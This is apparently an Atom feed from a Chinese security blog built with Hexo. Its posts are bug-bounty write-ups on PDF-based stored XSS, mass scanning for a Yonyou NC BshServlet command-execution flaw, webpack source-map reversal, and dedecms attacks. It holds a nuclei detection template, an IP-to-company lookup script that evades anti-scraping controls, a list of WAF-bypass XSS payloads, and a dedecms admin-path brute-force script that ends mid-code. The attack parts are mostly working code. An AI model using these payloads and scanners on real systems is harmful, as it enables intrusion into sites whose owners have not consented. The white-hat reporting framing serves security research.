<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-03-06T06:31:05.321Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>上传pdf文件造成xss</title>
    <link href="http://example.com/2021/10/02/%E4%B8%8A%E4%BC%A0pdf%E6%96%87%E4%BB%B6%E9%80%A0%E6%88%90xss/"/>
    <id>http://example.com/2021/10/02/%E4%B8%8A%E4%BC%A0pdf%E6%96%87%E4%BB%B6%E9%80%A0%E6%88%90xss/</id>
    <published>2021-10-01T16:00:00.000Z</published>
    <updated>2022-03-06T06:31:05.321Z</updated>
    
    <content type="html"><![CDATA[<p>在一次挖src过程中，来到当前页面，点击邮箱图标</p><p><img src="/2021/10/02/%E4%B8%8A%E4%BC%A0pdf%E6%96%87%E4%BB%B6%E9%80%A0%E6%88%90xss/clip_image002.jpg" alt="img"></p><p>弹出一个留言功能，有个上传附件功能</p><p><img src="/2021/10/02/%E4%B8%8A%E4%BC%A0pdf%E6%96%87%E4%BB%B6%E9%80%A0%E6%88%90xss/clip_image002-1646547625735.jpg" alt="img"></p><p>首先上传一个正常的图片，返回上传成功后图片的链接，图片被传到另一个域名下。</p><p><img src="/2021/10/02/%E4%B8%8A%E4%BC%A0pdf%E6%96%87%E4%BB%B6%E9%80%A0%E6%88%90xss/clip_image002-1646547643509.jpg" alt="img"></p><p>访问上传的图片</p><p><img src="/2021/10/02/%E4%B8%8A%E4%BC%A0pdf%E6%96%87%E4%BB%B6%E9%80%A0%E6%88%90xss/clip_image002-1646547656508.jpg" alt="img"></p><p>去掉图片路径，查看该域名的主页，可以看出该域名专门用来放置上传的图片资源，没有执行语言的权限</p><p><img src="/2021/10/02/%E4%B8%8A%E4%BC%A0pdf%E6%96%87%E4%BB%B6%E9%80%A0%E6%88%90xss/clip_image002-1646547664422.jpg" alt="img"></p><p>所以无法进行getsell，通过随机后缀名发现使用的是黑名单进行过滤</p><p><img src="/2021/10/02/%E4%B8%8A%E4%BC%A0pdf%E6%96%87%E4%BB%B6%E9%80%A0%E6%88%90xss/clip_image002-1646547671467.jpg" alt="img"></p><p>尝试上传html后缀造成存储型XSS，上传失败，html后缀在黑名单中</p><p><img src="/2021/10/02/%E4%B8%8A%E4%BC%A0pdf%E6%96%87%E4%BB%B6%E9%80%A0%E6%88%90xss/clip_image002.png" alt="1633150312"></p><p>尝试上传pdf文件，发现能够在线预览，这时候以我十多年的挖洞经验来看，可以试着上传pdf文件进行弹框</p><p>pdf弹框制作：使用迅捷pdf编辑器新建一个pdf文件</p><p><img src="/2021/10/02/%E4%B8%8A%E4%BC%A0pdf%E6%96%87%E4%BB%B6%E9%80%A0%E6%88%90xss/clip_image002-1646547706140.jpg" alt="img"></p><p>点击左边导航空白页，然后点击属性，右边导航就会出现页面属性</p><p><img src="/2021/10/02/%E4%B8%8A%E4%BC%A0pdf%E6%96%87%E4%BB%B6%E9%80%A0%E6%88%90xss/clip_image002-1646547716526.jpg" alt="img"></p><p>双击动作下面的打开页面，选择新增动作，选择JavaScript类型，添加代码：app.alert(‘XSS’)</p><p><img src="/2021/10/02/%E4%B8%8A%E4%BC%A0pdf%E6%96%87%E4%BB%B6%E9%80%A0%E6%88%90xss/clip_image002-1646547725227.jpg" alt="img"></p><p>将生成好的pdf文件上传到该网站，上传成功</p><p><img src="/2021/10/02/%E4%B8%8A%E4%BC%A0pdf%E6%96%87%E4%BB%B6%E9%80%A0%E6%88%90xss/clip_image002-1646547734040.jpg" alt="img"></p><p>访问上传的pdf文件，造成弹框（本机环境测试谷歌浏览器可以造成弹框，火狐不行）</p><p><img src="/2021/10/02/%E4%B8%8A%E4%BC%A0pdf%E6%96%87%E4%BB%B6%E9%80%A0%E6%88%90xss/clip_image002-1646547744768.jpg" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在一次挖src过程中，来到当前页面，点击邮箱图标&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/10/02/%E4%B8%8A%E4%BC%A0pdf%E6%96%87%E4%BB%B6%E9%80%A0%E6%88%90xss/clip_image002.jpg&quot; alt</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>一次补天公益刷洞过程</title>
    <link href="http://example.com/2021/08/30/%E4%B8%80%E6%AC%A1%E8%A1%A5%E5%A4%A9%E5%85%AC%E7%9B%8A%E5%88%B7%E6%B4%9E%E8%BF%87%E7%A8%8B/"/>
    <id>http://example.com/2021/08/30/%E4%B8%80%E6%AC%A1%E8%A1%A5%E5%A4%A9%E5%85%AC%E7%9B%8A%E5%88%B7%E6%B4%9E%E8%BF%87%E7%A8%8B/</id>
    <published>2021-08-30T01:13:47.278Z</published>
    <updated>2022-03-06T06:25:05.609Z</updated>
    
    <content type="html"><![CDATA[<p>在补天平台出了一个活动，白帽子提交公益漏洞通过了都可以获取库币，对这一次活动记录一下批量刷洞的过程。</p><p>使用工具：nuclei，fofa采集器，httpx，python脚本</p><p>首先决定刷的漏洞是NC bsh.servlt.BshServlet远程命令执行和泛微OA8前台SQL注入，使用nuclei编写poc，原理是对目标url拼接/servlet/~ic/bsh.servlet.BshServlet，如果返回包内容存在print(“hello!”);，说明存在。poc内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">id: NC_bsh远程命令执行漏洞</span><br><span class="line"></span><br><span class="line">info:</span><br><span class="line">  name: NC_bsh远程命令执行漏洞</span><br><span class="line">  author: noEvery</span><br><span class="line">  severity: high</span><br><span class="line">  tags: my,cve,nc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">requests:</span><br><span class="line">  - method: GET</span><br><span class="line">    path:</span><br><span class="line">      - &quot;&#123;&#123;BaseURL&#125;&#125;&#x2F;servlet&#x2F;~ic&#x2F;bsh.servlet.BshServlet&quot;</span><br><span class="line"></span><br><span class="line">    matchers-condition: and</span><br><span class="line">    matchers:</span><br><span class="line">      - type: status</span><br><span class="line">        status:</span><br><span class="line">          - 200</span><br><span class="line">      - type: word</span><br><span class="line">        words:</span><br><span class="line">          - &#39;print(&quot;hello!&quot;);&#39;</span><br></pre></td></tr></table></figure><p>使用fofa采集器收集存在nc系统的网站，将目标提取出来</p><p><img src="/2021/08/30/%E4%B8%80%E6%AC%A1%E8%A1%A5%E5%A4%A9%E5%85%AC%E7%9B%8A%E5%88%B7%E6%B4%9E%E8%BF%87%E7%A8%8B/01.jpg" alt="图1"></p><p>使用httpx进行发包探测，将能够访问的目标进行提取</p><p><img src="/2021/08/30/%E4%B8%80%E6%AC%A1%E8%A1%A5%E5%A4%A9%E5%85%AC%E7%9B%8A%E5%88%B7%E6%B4%9E%E8%BF%87%E7%A8%8B/02.jpg" alt="图2"></p><p>将写好的poc和目标放到服务器上使用nuclei运行，-l 指定目标文件，-t 指定写好的poc脚本</p><p><img src="/2021/08/30/%E4%B8%80%E6%AC%A1%E8%A1%A5%E5%A4%A9%E5%85%AC%E7%9B%8A%E5%88%B7%E6%B4%9E%E8%BF%87%E7%A8%8B/03.jpg" alt="图3"></p><p>得到的结果文件如下</p><p><img src="/2021/08/30/%E4%B8%80%E6%AC%A1%E8%A1%A5%E5%A4%A9%E5%85%AC%E7%9B%8A%E5%88%B7%E6%B4%9E%E8%BF%87%E7%A8%8B/04.jpg" alt="图4"></p><p>因为fofa搜集出来的大部分是ip，需要批量查出域名和公司名称，这里使用自己写的python脚本进行批量查询，脚本流程是先正则匹配链接中的ip进行提取，使用ip在爱站中反查域名，拿到域名再到站长之家的icp备案查询获取公司名称。针对爱站和站长之家的icp备案进行查询，爱站存在反机制，添加随机UA头和sleep(1.5)延迟查询绕过，脚本中的user-agents.txt文件存放着多个不同的UA头。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3.6</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2021&#x2F;8&#x2F;14 19:38</span><br><span class="line"># @File    : ip提取.py</span><br><span class="line"># @Software: PyCharm</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">ip_re &#x3D; re.compile(r&#39;((25[0-5])|(2[0-4]\d)|(1\d\d)|([1-9]\d)|\d)(\.((25[0-5])|(2[0-4]\d)|(1\d\d)|([1-9]\d)|\d))&#123;3&#125;&#39;)</span><br><span class="line">sub_re &#x3D; re.compile(&#39;&lt;a href&#x3D;&quot;.*?&quot; rel&#x3D;&quot;nofollow&quot; target&#x3D;&quot;_blank&quot;&gt;(.*?)&lt;&#x2F;a&gt;&#39;)</span><br><span class="line">company_re &#x3D; re.compile(&#39;&lt;a target&#x3D;&quot;_blank&quot; href&#x3D;&quot;&#x2F;&#x2F;data.chinaz.com&#x2F;company&#x2F;t0-p0-c0-i0-d0-s-(.*?)&quot;&gt;&#39;)</span><br><span class="line"># 添加随机UA头</span><br><span class="line">with open(&#39;user-agents.txt&#39;, &#39;r&#39;) as f_UA:</span><br><span class="line">    user_agents &#x3D; f_UA.readlines()</span><br><span class="line">res &#x3D; open(&#39;res.txt&#39;,&#39;w&#39;,encoding&#x3D;&#39;utf-8&#39;)</span><br><span class="line">##把同一行的ip换行,然后写进result.txt的文件里</span><br><span class="line">with open(&#39;target.txt&#39;, &#39;r&#39;, encoding&#x3D;&#39;utf-8&#39;) as readlist:</span><br><span class="line">    for dirs in readlist.readlines():</span><br><span class="line">        headers &#x3D; &#123;</span><br><span class="line">            &#39;User-Agent&#39;: random.choice(user_agents).strip()</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            dir &#x3D; ip_re.search(dirs).group()</span><br><span class="line">        except:</span><br><span class="line">            print(&#39;没有ip&#39;)</span><br><span class="line">            continue</span><br><span class="line">        url &#x3D; &quot;https:&#x2F;&#x2F;dns.aizhan.com&#x2F;&quot;+ dir +&quot;&#x2F;&quot;</span><br><span class="line">        response &#x3D; requests.get(url&#x3D;url,headers&#x3D;headers).text</span><br><span class="line">        sub &#x3D; sub_re.findall(response)</span><br><span class="line">        time.sleep(1.5)</span><br><span class="line">        if len(sub) &gt; 0:</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;icp.chinaz.com&#x2F;&quot; + sub[0]</span><br><span class="line">            response &#x3D; requests.get(url&#x3D;url, headers&#x3D;headers).text</span><br><span class="line">            company &#x3D; company_re.findall(response)</span><br><span class="line">            if len(company)&gt;0:</span><br><span class="line">                target &#x3D; dirs.replace(&#39;\n&#39;,&#39;&#39;) + &quot;      -----IP：&quot;+dir+&quot;域名为：&quot; + sub[0] + &quot;   公司名称：&quot; + company[0]</span><br><span class="line">                print(target)</span><br><span class="line">                res.write(target + &#39;\n&#39;)</span><br><span class="line">res.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>获取的结果文件如下（以下结果是我半个月前运行得到的，那时候爱站还能通过这种方式绕过反爬策略，可能是前些日子爬的次数太多，爱站修改了查询规则，需要登录才可以进行查询）：</p><p><img src="/2021/08/30/%E4%B8%80%E6%AC%A1%E8%A1%A5%E5%A4%A9%E5%85%AC%E7%9B%8A%E5%88%B7%E6%B4%9E%E8%BF%87%E7%A8%8B/05.jpg" alt="图5"></p><p>就差提交到补天就完事了，泛微OA8前台SQL注入也是一样的流程。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在补天平台出了一个活动，白帽子提交公益漏洞通过了都可以获取库币，对这一次活动记录一下批量刷洞的过程。&lt;/p&gt;
&lt;p&gt;使用工具：nuclei，fofa采集器，httpx，python脚本&lt;/p&gt;
&lt;p&gt;首先决定刷的漏洞是NC bsh.servlt.BshServlet远程命令</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>webpack反编译</title>
    <link href="http://example.com/2021/06/17/webpack%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
    <id>http://example.com/2021/06/17/webpack%E5%8F%8D%E7%BC%96%E8%AF%91/</id>
    <published>2021-06-17T07:04:39.220Z</published>
    <updated>2022-03-06T06:24:42.183Z</updated>
    
    <content type="html"><![CDATA[<p>在一次项目中遇到了.js.map文件，猜测app.26ef7a3e.js.map是webpack打包后生成的文件</p><p><img src="/2021/06/17/webpack%E5%8F%8D%E7%BC%96%E8%AF%91/01.jpg" alt="图1"></p><p>wapplyzer插件查看网站信息，可以看到前端技术使用的是Vue框架，模块打包技术使用webpack</p><p>想要将其反编译出前端源码，需要使用node中的reverse-sourcemap模块进行反编译</p><p>首先安装node，本地环境已安装好node，版本为12.18.3，自行下载可到<code>https://nodejs.org/zh-cn/ </code>node官网下载</p><p><img src="/2021/06/17/webpack%E5%8F%8D%E7%BC%96%E8%AF%91/02.jpg" alt="图2"></p><p>node安装好自带了npm工具可以安装模块使用</p><p>安装reverse-sourcemap：npm install –global reverse-sourcemap</p><p>–global 全局安装，我在之前就已经安装过了，所以跳过这个步骤。</p><p>下载.js.map文件：curl -O <code>https://www.xxx.com/js/app.26ef7a3e.js.map</code></p><p>下载下来后使用命令进行反编译：reverse-sourcemap --output-dir ./test app.26ef7a3e.js.map</p><p>–output-dir  输出文件所放位置的目录</p><p>app.26ef7a3e.js.map 需要进行反编译的文件</p><p><img src="/2021/06/17/webpack%E5%8F%8D%E7%BC%96%E8%AF%91/03.jpg" alt="图3"></p><p>查看test目录可以看到反编译成功！</p><p><img src="/2021/06/17/webpack%E5%8F%8D%E7%BC%96%E8%AF%91/04.jpg" alt="图4"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在一次项目中遇到了.js.map文件，猜测app.26ef7a3e.js.map是webpack打包后生成的文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/06/17/webpack%E5%8F%8D%E7%BC%96%E8%AF%91/01.jpg&quot; alt=&quot;图1&quot;</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>dedecms挖掘</title>
    <link href="http://example.com/2021/06/15/dedecms%E6%8C%96%E6%8E%98/"/>
    <id>http://example.com/2021/06/15/dedecms%E6%8C%96%E6%8E%98/</id>
    <published>2021-06-15T01:34:23.330Z</published>
    <updated>2022-03-06T06:24:30.737Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、存储型XSS"><a href="#一、存储型XSS" class="headerlink" title="一、存储型XSS"></a>一、存储型XSS</h2><p>在一次测试中通过CMS指纹识别出是dedecms模板，网上爆出过当前CMS的多种漏洞，逐一尝试。</p><p>使用dedecms几个常用的后台路径访问，没找到后台，御剑扫描了一下目录，无果。于是来到前台用户界面，创建一个用户，来到用户界面，在内容中心有一个文章功能，进入发布文章的详细内容中，填写文章资料，使用富文本选择html模式，插入绕waf的payload语句&lt;details onclick=&quot;alert`1`&quot;&gt;&lt;/details&gt;，保存，发布文章成功</p><p><img src="/2021/06/15/dedecms%E6%8C%96%E6%8E%98/01.jpg" alt="图1"></p><p>遇到waf时可尝试使用下面一些payload语句,也可以搭配混合绕：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;details onclick&#x3D;alert(1)&gt;&lt;&#x2F;details&gt;</span><br><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;input type&#x3D;submit formaction&#x3D;javascript:alert&#96;1&#96;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">eval(&quot;\x61\x6C\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29&quot;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;confirm&#x2F;**&#x2F;(1)&#x2F;**&#x2F;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;svg&#x2F;onload&#x3D;alert(1)&gt;</span><br><span class="line">当alert(1)被过滤时可以尝试如下payload</span><br><span class="line">alert&#96;1&#96;</span><br><span class="line">(alert)(1)</span><br><span class="line">(alert)&#96;1&#96;</span><br></pre></td></tr></table></figure><p>发布成功后会返回刚刚创建好的文章链接，状态是未审核中，访问刚刚发布的文章，点击详细信息（刚刚插入的payload生成的标签），触发XSS</p><p><img src="/2021/06/15/dedecms%E6%8C%96%E6%8E%98/02.jpg" alt="图2"></p><h2 id="二、url重定向"><a href="#二、url重定向" class="headerlink" title="二、url重定向"></a>二、url重定向</h2><p>dedecms 5.7 sp1中/plus/download.php存在下载重定向漏洞，例如链接：</p><p>http:/xxx.xxx.xxx/plus/download.php?open=1&amp;link=aHR0cHM6Ly93d3cuYmFpZHUuY29t其中link参数是<a href="https://www.baidu.com的base64编码,访问当前链接会跳转到百度页面/">https://www.baidu.com的base64编码，访问当前链接会跳转到百度页面</a></p><p><img src="/2021/06/15/dedecms%E6%8C%96%E6%8E%98/03.jpg" alt="图3"></p><h2 id="三、弱口令"><a href="#三、弱口令" class="headerlink" title="三、弱口令"></a>三、弱口令</h2><p>寻找网站后台，后面请教了我的领导，dedecms可以通过获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload…. ,利用这个逻辑猜目录的前提是目录内有图片格式的文件，利用此逻辑遍历后台路径，使用python脚本如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">import itertools</span><br><span class="line">from random import choice</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">characters &#x3D; &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!#@-&quot;</span><br><span class="line">back_dir &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">show_message &#x3D; &#123;&#125;</span><br><span class="line">check_message &#x3D; &#123;&#125;</span><br><span class="line">valid_file &#x3D; []</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">    &quot;_FILES[tools][tmp_name]&quot;: &quot;.&#x2F;..&#x2F;&#123;p&#125;&lt;&lt;&#x2F;images&#x2F;adminico.gif&quot;,</span><br><span class="line">    &quot;_FILES[tools][name]&quot;: 0,</span><br><span class="line">    &quot;_FILES[tools][size]&quot;: 0,</span><br><span class="line">    &quot;_FILES[tools][type]&quot;: &quot;image&#x2F;gif&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers &#x3D; &#123;</span><br><span class="line"></span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko&#x2F;20100101 Firefox&#x2F;40.0&quot;,</span><br><span class="line">    &quot;Accept&quot;: &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8&quot;,</span><br><span class="line">    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3&quot;,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;,</span><br><span class="line">    &quot;Connection&quot;: &quot;Close&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Bute_Login:</span><br><span class="line">    global headers</span><br><span class="line"></span><br><span class="line">    def __init__(self, target):</span><br><span class="line">        self.target &#x3D; target</span><br><span class="line"></span><br><span class="line">    def Check(self):</span><br><span class="line">        global data, check_message, valid_file</span><br><span class="line"></span><br><span class="line">        File_Chek_List &#x3D; [&#39;&#x2F;tags.php&#39;, &#39;&#x2F;include&#x2F;vdimgck.php&#39;, &#39;&#x2F;m&#x2F;list.php&#39;, &#39;&#x2F;m&#x2F;view.php&#39;, &#39;&#x2F;member&#x2F;config.php&#39;,</span><br><span class="line">                          &#39;&#x2F;plus&#x2F;advancedsearch.php&#39;,</span><br><span class="line">                          &#39;&#x2F;plus&#x2F;arcmulti.php&#39;, &#39;&#x2F;plus&#x2F;bookfeedback.php&#39;, &#39;&#x2F;plus&#x2F;bookfeedback_js.php&#39;, &#39;&#x2F;plus&#x2F;car.php&#39;,</span><br><span class="line">                          &#39;&#x2F;plus&#x2F;carbuyaction.php&#39;,</span><br><span class="line">                          &#39;&#x2F;plus&#x2F;comments_frame.php&#39;, &#39;&#x2F;plus&#x2F;count.php&#39;, &#39;&#x2F;plus&#x2F;digg_ajax.php&#39;, &#39;&#x2F;plus&#x2F;digg_frame.php&#39;,</span><br><span class="line">                          &#39;&#x2F;plus&#x2F;digg_frame.php&#39;,</span><br><span class="line">                          &#39;&#x2F;plus&#x2F;disdls.php&#39;, &#39;&#x2F;plus&#x2F;diy.php&#39;, &#39;&#x2F;plus&#x2F;download.php&#39;, &#39;&#x2F;plus&#x2F;erraddsave.php&#39;,</span><br><span class="line">                          &#39;&#x2F;plus&#x2F;feedback.php&#39;, &#39;&#x2F;plus&#x2F;feedback_ajax.php&#39;, &#39;&#x2F;plus&#x2F;flink.php&#39;, &#39;&#x2F;plus&#x2F;flink.php&#39;,</span><br><span class="line">                          &#39;&#x2F;plus&#x2F;flink_add.php&#39;,</span><br><span class="line">                          &#39;&#x2F;plus&#x2F;freelist.php&#39;, &#39;&#x2F;plus&#x2F;heightsearch.php&#39;, &#39;&#x2F;plus&#x2F;list.php&#39;, &#39;&#x2F;plus&#x2F;mytag_js.php&#39;,</span><br><span class="line">                          &#39;&#x2F;plus&#x2F;posttocar.php&#39;, &#39;&#x2F;plus&#x2F;qrcode.php&#39;, &#39;&#x2F;plus&#x2F;recommend.php&#39;, &#39;&#x2F;plus&#x2F;rss.php&#39;,</span><br><span class="line">                          &#39;&#x2F;plus&#x2F;search.php&#39;, &#39;&#x2F;plus&#x2F;showphoto.php&#39;,</span><br><span class="line">                          &#39;&#x2F;plus&#x2F;stow.php&#39;, &#39;&#x2F;plus&#x2F;view.php&#39;, &#39;&#x2F;plus&#x2F;vote.php&#39;, &#39;&#x2F;special&#x2F;index.php&#39;]</span><br><span class="line">        for filename in File_Chek_List:</span><br><span class="line">            try:</span><br><span class="line">                res &#x3D; requests.post(self.target + filename, data&#x3D;data)</span><br><span class="line">                # print self.target+filename+&quot;---&gt;&quot;+res.text</span><br><span class="line">                if &quot;Upload filetype not allow !&quot; in res.text and res.status_code &#x3D;&#x3D; 200:</span><br><span class="line">                    valid_file.append(filename)</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line">        # print valid_file</span><br><span class="line">        # print valid_file</span><br><span class="line">        if len(valid_file):</span><br><span class="line">            if &quot;&#x2F;tags.php&quot; in valid_file:</span><br><span class="line">                for i in valid_file:</span><br><span class="line">                    if i &#x3D;&#x3D; &quot;&#x2F;tags.php&quot;:</span><br><span class="line">                        return i</span><br><span class="line">            else:</span><br><span class="line">                file_name &#x3D; choice(valid_file)</span><br><span class="line">                return file_name</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def Bute(self):</span><br><span class="line">        f_name &#x3D; self.Check()</span><br><span class="line">        # print f_name</span><br><span class="line">        if f_name !&#x3D; False:</span><br><span class="line">            if f_name &#x3D;&#x3D; &quot;&#x2F;tags.php&quot;:</span><br><span class="line">                prefix &#x3D; &quot;.&#x2F;&quot;</span><br><span class="line">            else:</span><br><span class="line">                prefix &#x3D; &quot;.&#x2F;..&#x2F;&quot;</span><br><span class="line">            flag &#x3D; 0</span><br><span class="line">            global characters, back_dir, data, check_message</span><br><span class="line">            for num in range(1, 7):</span><br><span class="line">                if flag:</span><br><span class="line">                    break</span><br><span class="line">                for pre in itertools.permutations(characters, num):</span><br><span class="line">                    pre &#x3D; &#39;&#39;.join(list(pre))</span><br><span class="line">                    data[&quot;_FILES[tools][tmp_name]&quot;] &#x3D; data[&quot;_FILES[tools][tmp_name]&quot;].format(p&#x3D;pre)</span><br><span class="line">                    print(&quot;testing&quot;, pre)</span><br><span class="line">                    r &#x3D; requests.post(self.target + f_name, data&#x3D;data)</span><br><span class="line">                    if &quot;Upload filetype not allow !&quot; not in r.text and r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">                        flag &#x3D; 1</span><br><span class="line">                        back_dir &#x3D; pre</span><br><span class="line">                        